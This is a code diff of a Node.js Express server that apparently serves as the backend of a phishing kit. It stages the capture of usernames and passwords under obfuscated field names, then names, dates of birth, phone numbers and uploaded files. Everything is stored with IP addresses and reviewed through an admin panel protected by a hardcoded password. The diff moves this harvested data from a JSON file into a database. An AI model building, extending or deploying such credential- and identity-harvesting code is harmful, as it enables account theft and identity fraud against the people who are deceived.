@@ -3,6 +3,7 @@ const cors = require('cors');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
+const db = require('./database');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -20,6 +21,7 @@ if (!fs.existsSync(uploadsDir)) {
 
 // Serve uploaded files
 app.use('/uploads', express.static(uploadsDir));
+
 
 // Configure multer for file uploads
 const storage = multer.diskStorage({
@@ -47,22 +49,8 @@ const upload = multer({
   }
 });
 
-// Data storage (in production, use a database)
-let collectedData = [];
-let siteVisitors = []; // Start with empty visitors array for clean tracking
-
-// Load existing data from file on startup
-const dataFile = path.join(__dirname, 'collected_data.json');
-if (fs.existsSync(dataFile)) {
-  try {
-    const existingData = fs.readFileSync(dataFile, 'utf8');
-    collectedData = JSON.parse(existingData);
-    console.log(`Loaded ${collectedData.length} existing data entries`);
-  } catch (error) {
-    console.error('Error loading existing data:', error);
-    collectedData = [];
-  }
-}
+// Database is now used for data storage
+console.log('✅ Database connection initialized');
 
 // Simple admin authentication (in production, use proper auth)
 const ADMIN_PASSWORD = 'admin123'; // Simple password for demo
@@ -98,97 +86,107 @@ app.use((req, res, next) => {
 });
 
 // Routes
-app.post('/api/login', (req, res) => {
+app.post('/api/login', async (req, res) => {
   const { xusr, xpss } = req.body;
   
   console.log('Login attempt:', { xusr, xpss });
   
-  // Store login data
-  collectedData.push({
-    type: 'login',
-    data: { xusr, xpss },
-    timestamp: new Date().toISOString(),
-    ip: req.ip || req.connection.remoteAddress,
-    userAgent: req.get('User-Agent')
-  });
-  
-  res.json({ success: true, message: 'Login successful' });
+  try {
+    // Create or get user session
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.get('User-Agent');
+    const userSession = await db.createUserSession(ip, userAgent);
+    
+    // Store login data
+    await db.storeLoginData(userSession.sessionId, { xusr, xpss }, ip, userAgent);
+    
+    // Store session ID in response for frontend to use
+    res.json({ 
+      success: true, 
+      message: 'Login successful',
+      sessionId: userSession.sessionId
+    });
+  } catch (error) {
+    console.error('Error storing login data:', error);
+    res.status(500).json({ success: false, message: 'Error storing data' });
+  }
 });
 
-app.post('/api/info', (req, res) => {
-  const { xname1, xname2, xdob, xtel } = req.body;
+app.post('/api/info', async (req, res) => {
+  const { xname1, xname2, xdob, xtel, sessionId } = req.body;
   
   console.log('Info submission:', { xname1, xname2, xdob, xtel });
   
-  // Store info data
-  collectedData.push({
-    type: 'info',
-    data: { xname1, xname2, xdob, xtel },
-    timestamp: new Date().toISOString(),
-    ip: req.ip || req.connection.remoteAddress,
-    userAgent: req.get('User-Agent')
-  });
-  
-  res.json({ success: true, message: 'Info submitted successfully' });
+  try {
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.get('User-Agent');
+    
+    // Store info data
+    await db.storeInfoData(sessionId, { xname1, xname2, xdob, xtel }, ip, userAgent);
+    
+    res.json({ success: true, message: 'Info submitted successfully' });
+  } catch (error) {
+    console.error('Error storing info data:', error);
+    res.status(500).json({ success: false, message: 'Error storing data' });
+  }
 });
 
-app.post('/api/upload', upload.single('file'), (req, res) => {
+app.post('/api/upload', upload.single('file'), async (req, res) => {
   const file = req.file;
-  const formData = req.body;
+  const { sessionId } = req.body;
   
   console.log('File upload request received');
   console.log('File object:', file);
-  console.log('Form data:', formData);
-  console.log('Request headers:', req.headers);
+  console.log('Session ID:', sessionId);
   
-  console.log('File upload:', {
-    filename: file ? file.filename : 'No file',
-    originalName: file ? file.originalname : 'No file',
-    size: file ? file.size : 0,
-    formData
-  });
-  
-  // Store upload data
-  collectedData.push({
-    type: 'upload',
-    data: {
+  try {
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.get('User-Agent');
+    
+    // Store upload data
+    await db.storeUploadData(sessionId, {
       filename: file ? file.filename : null,
       originalName: file ? file.originalname : null,
       size: file ? file.size : 0,
-      ...formData
-    },
-    timestamp: new Date().toISOString(),
-    ip: req.ip || req.connection.remoteAddress,
-    userAgent: req.get('User-Agent')
-  });
-  
-  res.json({ success: true, message: 'File uploaded successfully' });
+      path: file ? file.path : null,
+      mimeType: file ? file.mimetype : null
+    }, ip, userAgent);
+    
+    res.json({ success: true, message: 'File uploaded successfully' });
+  } catch (error) {
+    console.error('Error storing upload data:', error);
+    res.status(500).json({ success: false, message: 'Error storing data' });
+  }
 });
 
-app.post('/api/final', (req, res) => {
-  const data = req.body;
+app.post('/api/final', async (req, res) => {
+  const { sessionId, ...data } = req.body;
   
   console.log('Final data submission:', data);
   
-  // Store final data
-  collectedData.push({
-    type: 'final',
-    data: data,
-    timestamp: new Date().toISOString(),
-    ip: req.ip || req.connection.remoteAddress,
-    userAgent: req.get('User-Agent')
-  });
-  
-  // Save all collected data to file
-  const dataFile = path.join(__dirname, 'collected_data.json');
-  fs.writeFileSync(dataFile, JSON.stringify(collectedData, null, 2));
-  
-  res.json({ success: true, message: 'Data submitted successfully' });
+  try {
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.get('User-Agent');
+    
+    // Store final consolidated data
+    await db.storeFinalData(sessionId, data, ip, userAgent);
+    
+    res.json({ success: true, message: 'Data submitted successfully' });
+  } catch (error) {
+    console.error('Error storing final data:', error);
+    res.status(500).json({ success: false, message: 'Error storing data' });
+  }
 });
 
 // Get collected data (for monitoring)
-app.get('/api/data', (req, res) => {
-  res.json(collectedData);
+app.get('/api/data', async (req, res) => {
+  try {
+    const sessions = await db.getAllUserSessions();
+    res.json(sessions);
+  } catch (error) {
+    console.error('Error retrieving data:', error);
+    res.status(500).json({ error: 'Error retrieving data' });
+  }
 });
 
 // Health check
@@ -197,40 +195,22 @@ app.get('/api/health', (req, res) => {
 });
 
 // Track website visits
-app.post('/api/track-visit', (req, res) => {
-  const visitor = {
-    ip: req.ip || req.connection.remoteAddress,
-    userAgent: req.get('User-Agent'),
-    timestamp: new Date().toISOString(),
-    path: req.body.path || '/',
-    method: 'GET'
-  };
-  
-  // Check for duplicate visits (same IP, path, and within 10 seconds)
-  const now = new Date().getTime();
-  const tenSecondsAgo = now - 10000;
-  
-  const isDuplicate = siteVisitors.some(existingVisitor => {
-    const existingTime = new Date(existingVisitor.timestamp).getTime();
-    return existingVisitor.ip === visitor.ip && 
-           existingVisitor.path === visitor.path && 
-           existingTime > tenSecondsAgo;
-  });
-  
-  if (isDuplicate) {
-    console.log('Duplicate visit ignored:', visitor.path, 'from', visitor.ip);
-    return res.json({ success: true, message: 'Duplicate visit ignored' });
+app.post('/api/track-visit', async (req, res) => {
+  try {
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.get('User-Agent');
+    const path = req.body.path || '/';
+    
+    // Track visitor in database
+    await db.trackVisitor(ip, userAgent, path, 'GET');
+    
+    console.log('✅ Website visit tracked:', path, 'from', ip);
+    
+    res.json({ success: true, message: 'Visit tracked' });
+  } catch (error) {
+    console.error('Error tracking visit:', error);
+    res.status(500).json({ success: false, message: 'Error tracking visit' });
   }
-  
-  // Add to visitors array (keep only last 500 visitors for better performance)
-  siteVisitors.push(visitor);
-  if (siteVisitors.length > 500) {
-    siteVisitors = siteVisitors.slice(-500);
-  }
-  
-  console.log('✅ Website visit tracked:', visitor.path, 'from', visitor.ip);
-  
-  res.json({ success: true, message: 'Visit tracked' });
 });
 
 // Admin routes
@@ -244,73 +224,58 @@ app.post('/api/admin/login', (req, res) => {
   }
 });
 
-app.get('/api/admin/user-data', (req, res) => {
-  // Return all collected user data
-  res.json({
-    success: true,
-    data: collectedData,
-    total: collectedData.length
-  });
-});
-
-app.get('/api/admin/visitors', (req, res) => {
-  // Return site visitors data
-  res.json({
-    success: true,
-    data: siteVisitors,
-    total: siteVisitors.length
-  });
-});
-
-app.get('/api/admin/stats', (req, res) => {
-  // Group data by session (using IP + date as session identifier)
-  const sessionGroups = {};
-  
-  collectedData.forEach(item => {
-    const sessionKey = `${item.ip}-${item.timestamp.split('T')[0]}`;
-    if (!sessionGroups[sessionKey]) {
-      sessionGroups[sessionKey] = [];
-    }
-    sessionGroups[sessionKey].push(item);
-  });
-  
-  // Count unique user sessions (sessions that have completed the process)
-  const uniqueUserSessions = Object.values(sessionGroups).filter(session => 
-    session.some(item => item.type === 'final' || item.type === 'upload')
-  ).length;
-  
-  // Return basic statistics
-  const stats = {
-    totalUsers: uniqueUserSessions,
-    totalLogins: collectedData.filter(item => item.type === 'login').length,
-    totalVisitors: siteVisitors.length,
-    uniqueIPs: [...new Set(siteVisitors.map(v => v.ip))].length,
-    lastActivity: collectedData.length > 0 ? collectedData[collectedData.length - 1].timestamp : null
-  };
-  
-  res.json({
-    success: true,
-    stats: stats
-  });
-});
-
-app.delete('/api/admin/delete-data/:index', (req, res) => {
-  const index = parseInt(req.params.index);
-  
-  if (isNaN(index) || index < 0 || index >= collectedData.length) {
-    return res.status(400).json({ success: false, message: 'Invalid index' });
+app.get('/api/admin/user-data', async (req, res) => {
+  try {
+    const sessions = await db.getAllUserSessions();
+    res.json({
+      success: true,
+      data: sessions,
+      total: sessions.length
+    });
+  } catch (error) {
+    console.error('Error retrieving user data:', error);
+    res.status(500).json({ success: false, error: 'Error retrieving data' });
   }
+});
+
+app.get('/api/admin/visitors', async (req, res) => {
+  try {
+    const visitors = await db.getRecentVisitors(500);
+    res.json({
+      success: true,
+      data: visitors,
+      total: visitors.length
+    });
+  } catch (error) {
+    console.error('Error retrieving visitors:', error);
+    res.status(500).json({ success: false, error: 'Error retrieving data' });
+  }
+});
+
+app.get('/api/admin/stats', async (req, res) => {
+  try {
+    const stats = await db.getSessionStats();
+    res.json({
+      success: true,
+      stats: stats
+    });
+  } catch (error) {
+    console.error('Error retrieving stats:', error);
+    res.status(500).json({ success: false, error: 'Error retrieving stats' });
+  }
+});
+
+app.delete('/api/admin/delete-data/:sessionId', async (req, res) => {
+  const { sessionId } = req.params;
   
-  // Remove the item from the array
-  const deletedItem = collectedData.splice(index, 1)[0];
-  
-  // Save updated data to file
-  const dataFile = path.join(__dirname, 'collected_data.json');
-  fs.writeFileSync(dataFile, JSON.stringify(collectedData, null, 2));
-  
-  console.log(`Deleted data entry at index ${index}:`, deletedItem);
-  
-  res.json({ success: true, message: 'Data deleted successfully' });
+  try {
+    await db.deleteUserSession(sessionId);
+    console.log(`Deleted session: ${sessionId}`);
+    res.json({ success: true, message: 'Data deleted successfully' });
+  } catch (error) {
+    console.error('Error deleting session:', error);
+    res.status(500).json({ success: false, message: 'Error deleting data' });
+  }
 });
 
 // Error handling middleware
